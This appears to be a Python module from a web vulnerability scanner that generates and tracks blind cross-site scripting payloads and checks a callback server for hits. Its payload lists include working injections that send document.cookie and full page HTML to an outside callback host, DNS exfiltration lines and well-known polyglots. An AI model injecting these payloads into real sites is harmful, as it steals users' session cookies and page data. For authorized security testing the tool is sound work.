"""
Blind XSS Detection Engine
Detects XSS that executes in different contexts (admin panels, logs, emails, etc.)
Supports multiple callback providers: Interactsh, Burp Collaborator, XSS Hunter, Custom
"""
from colorama import Fore, Style
import time
import hashlib
from urllib.parse import quote
from core.callback_manager import CallbackManager

class BlindXSSDetector:
    """Detect blind XSS vulnerabilities using callback mechanisms"""
    
    def __init__(self, config):
        self.config = config
        self.callback_manager = CallbackManager(config)
        self.callback_domain = self.callback_manager.callback_domain
        self.payloads_sent = {}
        
        # Show callback status
        if self.callback_manager.is_enabled():
            status = self.callback_manager.get_status()
            if self.config.verbose:
                print(f"{Fore.GREEN}[+] Blind XSS detection ENABLED{Style.RESET_ALL}")
                print(f"{Fore.CYAN}[*] Provider: {status['provider']}{Style.RESET_ALL}")
                print(f"{Fore.CYAN}[*] Domain: {status['domain']}{Style.RESET_ALL}")
        else:
            if self.config.verbose:
                print(f"{Fore.YELLOW}[!] Blind XSS detection DISABLED (no callback server){Style.RESET_ALL}")
                print(f"{Fore.YELLOW}[!] Use --callback-provider and --callback-domain to enable{Style.RESET_ALL}")
        
    def generate_blind_payloads(self, identifier):
        """Generate blind XSS payloads with callback mechanisms"""
        
        if not self.callback_manager.is_enabled():
            # Use generic payloads without callbacks
            return self._get_generic_blind_payloads(identifier)
        
        # Generate callback URL using the manager
        callback_url = self.callback_manager.generate_callback_url(identifier)
        
        payloads = [
            # Image-based callbacks
            f'<img src="{callback_url}">',
            f'<img src=x onerror="this.src=\'{callback_url}\'">',
            
            # Script-based callbacks
            f'<script>fetch(\'{callback_url}\')</script>',
            f'<script>new Image().src=\'{callback_url}\'</script>',
            f'<script>document.location=\'{callback_url}\'</script>',
            
            # XMLHttpRequest callbacks
            f'<script>var xhr=new XMLHttpRequest();xhr.open(\'GET\',\'{callback_url}\');xhr.send()</script>',
            
            # WebSocket callbacks
            f'<script>new WebSocket(\'ws://{self.callback_domain}/{identifier}\')</script>',
            
            # DNS exfiltration
            f'<script>new Image().src=\'//\'+document.domain+\'.{identifier}.{self.callback_domain}\'</script>',
            
            # Cookie exfiltration
            f'<script>fetch(\'{callback_url}?c=\'+btoa(document.cookie))</script>',
            f'<script>new Image().src=\'{callback_url}?c=\'+document.cookie</script>',
            
            # DOM exfiltration
            f'<script>fetch(\'{callback_url}?d=\'+btoa(document.documentElement.innerHTML))</script>',
            
            # Multi-context payloads
            f'\"><img src={callback_url}>',
            f'\'><img src={callback_url}>',
            f'</script><script>fetch(\'{callback_url}\')</script>',
            f'</textarea><script>fetch(\'{callback_url}\')</script>',
            f'</select><img src={callback_url}>',
            
            # Event handler callbacks
            f'<svg onload="fetch(\'{callback_url}\')">',
            f'<body onload="fetch(\'{callback_url}\')">',
            f'<input onfocus="fetch(\'{callback_url}\')" autofocus>',
            
            # AngularJS callbacks
            f'{{{{constructor.constructor(\'fetch("{callback_url}")\')()}}}}',
            
            # Polyglot callbacks
            f'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=fetch(\'{callback_url}\') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=fetch(\'{callback_url}\')//\\x3e',
        ]
        
        return payloads
    
    def _get_generic_blind_payloads(self, identifier):
        """Get generic blind XSS payloads without callbacks"""
        return [
            # Time-based detection
            '<script>setTimeout(function(){},5000)</script>',
            
            # Storage-based
            f'<script>localStorage.setItem("xss_{identifier}","1")</script>',
            f'<script>sessionStorage.setItem("xss_{identifier}","1")</script>',
            
            # Console-based
            f'<script>console.log("XSS_{identifier}")</script>',
            
            # Alert-based (for admin panels)
            f'<script>alert("XSS_{identifier}")</script>',
            f'<img src=x onerror="alert(\'XSS_{identifier}\')">',
            
            # Multi-context
            f'\"><script>alert("XSS_{identifier}")</script>',
            f'\'><script>alert("XSS_{identifier}")</script>',
            f'</script><script>alert("XSS_{identifier}")</script>',
        ]
    
    def test_blind_xss(self, url, param_name, form_data=None):
        """Test for blind XSS vulnerabilities"""
        # Generate unique identifier for this test
        identifier = hashlib.md5(f"{url}{param_name}{time.time()}".encode()).hexdigest()[:12]
        
        payloads = self.generate_blind_payloads(identifier)
        
        if self.config.verbose:
            print(f"{Fore.CYAN}[*] Testing blind XSS on parameter '{param_name}'{Style.RESET_ALL}")
            if self.callback_manager.is_enabled():
                print(f"{Fore.CYAN}[*] Using callback domain: {self.callback_domain}{Style.RESET_ALL}")
        
        # Store payload info for later verification
        self.payloads_sent[identifier] = {
            'url': url,
            'parameter': param_name,
            'timestamp': time.time(),
            'payloads': payloads
        }
        
        return {
            'identifier': identifier,
            'payloads': payloads,
            'callback_domain': self.callback_domain
        }
    
    def check_callbacks(self, identifier=None, wait_time=0):
        """Check if any callbacks were received for a specific identifier"""
        if not self.callback_manager.is_enabled():
            return {
                'received': False,
                'callbacks': [],
                'note': 'Callback server not configured'
            }
        
        return self.callback_manager.check_callbacks(identifier, wait_time)
    
    def check_all_callbacks(self, wait_time=5):
        """Check all callbacks after scan completion"""
        if not self.callback_manager.is_enabled():
            return []
        
        if self.config.verbose:
            print(f"\n{Fore.CYAN}[*] Checking for blind XSS callbacks...{Style.RESET_ALL}")
        
        result = self.callback_manager.check_callbacks(wait_time=wait_time)
        
        if result['received']:
            callbacks = result.get('callbacks', [])
            if self.config.verbose:
                print(f"{Fore.GREEN}[+] Received {len(callbacks)} callback(s)!{Style.RESET_ALL}")
            
            # Match callbacks to sent payloads
            verified_vulns = []
            for callback in callbacks:
                # Try to match callback to sent payload
                for identifier, payload_info in self.payloads_sent.items():
                    if identifier in str(callback):
                        verified_vulns.append({
                            'identifier': identifier,
                            'payload_info': payload_info,
                            'callback': callback,
                            'verified': True
                        })
                        break
            return verified_vulns
        else:
            if self.config.verbose:
                print(f"{Fore.YELLOW}[!] No callbacks received{Style.RESET_ALL}")
            return []
    
    def cleanup(self):
        """Cleanup callback manager session"""
        if self.callback_manager:
            self.callback_manager.cleanup()
    
    def generate_polyglot_payloads(self):
        """Generate polyglot XSS payloads that work in multiple contexts"""
        return [
            # Rsnake's polyglot
            'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//\\x3e',
            
            # Gareth Heyes polyglot
            '\'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\\></|\\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>\'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id)>\'"><img src="http://i.imgur.com/P8mL8.jpg">',
            
            # Multiple context polyglot
            '\'"--></style></script></title></textarea></noscript></noembed></template></frameset><svg onload=alert(1)>',
            
            # HTML + JavaScript polyglot
            '"><svg/onload=alert(1)>',
            '\'-alert(1)-\'',
            '\";alert(1);//',
            
            # Attribute + HTML polyglot
            '" autofocus onfocus=alert(1) x="',
            '\' autofocus onfocus=alert(1) x=\'',
            
            # URL + JavaScript polyglot
            'javascript:alert(1)//\';alert(1);//";alert(1);//\\";alert(1);//-->',
        ]
